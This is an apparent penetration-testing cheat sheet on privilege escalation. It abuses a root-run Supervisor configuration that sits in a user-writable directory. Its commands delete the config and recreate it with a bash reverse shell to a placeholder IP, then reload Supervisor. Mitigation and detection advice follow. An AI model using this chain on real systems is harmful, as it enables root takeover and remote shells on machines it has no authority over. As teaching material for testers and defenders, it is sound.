---
topic: Supervisor — configuration replacement through directory permissions
tags: [linux, supervisor, permissions, privesc]
---

# Supervisor — configuration replacement through directory permissions

**English** | [🌐 Español](supervisor-config-directory-replace.md)

## Concept

Supervisor reads configuration files and runs the defined programs as root. If the file is owned by root but lives in a user-writable directory, it can be deleted and recreated even when it cannot be edited. Directory permissions override file protection.

## When it applies

- Supervisor runs as root and loads configuration from a user directory.
- The file is owned by root but the directory allows delete and create.
- Root execution is needed without touching the original file.

## Procedure

1. Locate configuration files and directories.
2. Check file and directory permissions.
3. Delete the file and recreate it with a malicious program.
4. Wait for the reload or restart the service.

## Commands

```bash
ls -la /home/<USER>/config/
rm /home/<USER>/config/supervisord.conf
printf '[program:x]\ncommand=/bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"\n' > /home/<USER>/config/supervisord.conf
supervisorctl reread
```

## Variants

- Add a file in `conf.d` if the directory is writable.
- Change the `command` of an existing program.
- Use a symlink to point to another path.

## Limitations

- Supervisor must reload the configuration.
- The file may have immutable attributes.
- SELinux/AppArmor may block writes.

## Mitigation

- Mount configuration read-only in non-writable directories.
- Run Supervisor without root and validate ownership.
- Audit configuration directory permissions.

## Detection

- Changes to Supervisor files outside deployments.
- New programs executed by `supervisord`.
- Configuration deletions and recreations.

## References

- [0xdf — LaCasaDePapel](https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html)
- [Supervisor — Configuration](http://supervisord.org/configuration.html)
- [CWE-732 — Incorrect Permission Assignment](https://cwe.mitre.org/data/definitions/732.html)
